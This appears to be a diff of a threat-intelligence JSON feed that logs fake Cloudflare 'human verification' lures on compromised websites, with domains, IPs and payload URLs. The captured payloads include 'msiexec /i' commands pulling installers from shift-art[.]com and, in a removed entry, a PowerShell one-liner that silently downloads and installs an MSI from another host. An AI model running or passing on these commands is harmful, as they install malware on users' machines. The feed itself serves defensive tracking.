@@ -1,5 +1,53 @@
 [
   {
+    "UrlDomain": "garrygolden.net",
+    "DeliveryUrl": [
+      "shift-art.com"
+    ],
+    "PayloadUrl": [
+      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
+    ],
+    "IP": [
+      "162.241.217.246"
+    ],
+    "Related": [
+      {
+        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
+    "ResolvedDownloadUrl": [
+      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
+    ],
+    "ReportId": "cmwicn28d0ztc0oml2lvkp9eu",
+    "ScannedAt": "2026-11-15T21:31:07.231000+00:00"
+  },
+  {
+    "UrlDomain": "www.tampilkan.com",
+    "DeliveryUrl": [
+      "shift-art.com"
+    ],
+    "PayloadUrl": [
+      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
+    ],
+    "IP": [
+      "194.5.152.128"
+    ],
+    "Related": [
+      {
+        "Value": "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/custo",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiex...\n...ps://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ msiexec /i https://shift-art[.]com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/ Verif...\nFake",
+    "ResolvedDownloadUrl": [
+      "https://shift-art.com/123/cloudflare/verify/humanverfification/cloudflarechallenge/CustomerID37832738/"
+    ],
+    "ReportId": "cmwibrmxl0zoa0omlbyzngmgj",
+    "ScannedAt": "2026-11-15T21:06:41.001000+00:00"
+  },
+  {
     "UrlDomain": "saluteopinioni.it",
     "DeliveryUrl": [
       "browse-cloud.codes"
@@ -4860,24 +4908,5 @@
     ],
     "ReportId": "cmwcq9cnn0c1l0omlfc0yrkd9",
     "ScannedAt": "2026-11-11T23:05:45.104000+00:00"
-  },
-  {
-    "UrlDomain": "24hr.co.il",
-    "DeliveryUrl": [
-      "softsyncizobrazie.net"
-    ],
-    "PayloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "IP": [
-      "80.244.168.18"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"http://softsyncizobrazie[.]net/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "http://softsyncizobrazie.net/x"
-    ],
-    "ReportId": "cmwclwpgw0a210omltnipi6za",
-    "ScannedAt": "2026-11-11T21:03:56.705000+00:00"
   }
 ]
